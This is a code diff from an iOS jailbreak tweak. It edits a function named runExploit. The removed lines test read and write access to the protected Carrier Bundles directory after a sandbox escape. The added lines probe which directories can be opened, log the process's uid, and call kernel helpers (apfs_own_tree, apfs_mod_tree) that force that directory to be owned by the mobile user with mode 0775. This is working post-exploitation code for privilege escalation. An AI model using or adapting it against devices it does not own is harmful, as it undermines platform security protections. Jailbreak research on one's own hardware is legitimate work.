@@ -632,25 +632,28 @@ static void runExploit(void) {
     // first time Filza lists anything inside /var/containers/Bundle/Application/
     // <UUID>/<Name>.app, apfs_own_tree fires on that .app in the background.
 
-    // --- NEW: verify Carrier Bundles access after sandbox escape ---
-    int fd_r = open("/var/mobile/Library/Carrier Bundles", O_RDONLY);
-    if (fd_r >= 0) {
-        close(fd_r);
-        NSLog(@"[Tweak] ✅ Carrier Bundles 可读");
-
-        // Try a write path to confirm DAC also lets us through
-        int fd_w = open("/var/mobile/Library/Carrier Bundles/.dsh_write_test", O_RDWR|O_CREAT, 0644);
-        if (fd_w >= 0) {
-            close(fd_w); unlink("/var/mobile/Library/Carrier Bundles/.dsh_write_test");
-            NSLog(@"[Tweak] ✅ Carrier Bundles 可写 — apfs_mod_tree / apfs_setflag 应该通");
-        } else {
-            NSLog(@"[Tweak] ⚠️ Carrier Bundles open(O_WRONLY) 失败 errno=%d (%s) — "
-                  @"sandbox_elevate_to_root 可能未成功, DAC 仍在拦截", errno, strerror(errno));
-        }
-    } else {
-        NSLog(@"[Tweak] ❌ Carrier Bundles open(O_RDONLY) 失败 errno=%d (%s) — "
-              @"sandbox_escape 未完全生效，路径仍被 Seatbelt 拦截", errno, strerror(errno));
+    // --- Debug: path probe every component to find where blocked ---
+    NSLog(@"[Tweak] === PATH PROBE ===");
+    const char *paths[] = { "/", "/var", "/var/mobile", "/var/mobile/Library", "/var/mobile/Library/Carrier Bundles", NULL };
+    for (int i = 0; paths[i]; i++) {
+        DIR *d = opendir(paths[i]);
+        if (d) { closedir(d); NSLog(@"[Tweak]   OK: %s", paths[i]); }
+        else { NSLog(@"[Tweak]   FAIL: %s  errno=%d (%s)", paths[i], errno, strerror(errno)); }
     }
+    NSLog(@"[Tweak] getuid()=%d geteuid()=%d", getuid(), geteuid());
+
+    // Kernel-force Carrier Bundles ownership to mobile + relax perms
+    NSLog(@"[Tweak] === apfs_own_tree + apfs_mod_tree Carrier Bundles ===");
+    int ret = apfs_own_tree("/var/mobile/Library/Carrier Bundles", 501, 501);
+    NSLog(@"[Tweak] apfs_own_tree ret=%d", ret);
+    ret = apfs_mod_tree("/var/mobile/Library/Carrier Bundles", 0775);
+    NSLog(@"[Tweak] apfs_mod_tree ret=%d", ret);
+
+    // Re-probe
+    const char *cb2 = "/var/mobile/Library/Carrier Bundles";
+    DIR *d2 = opendir(cb2);
+    if (d2) { closedir(d2); NSLog(@"[Tweak]   OK after apfs fix: %s", cb2); }
+    else { NSLog(@"[Tweak]   STILL BLOCKED: %s  errno=%d (%s)", cb2, errno, strerror(errno)); }
 }
 
 #pragma mark - Entry Point
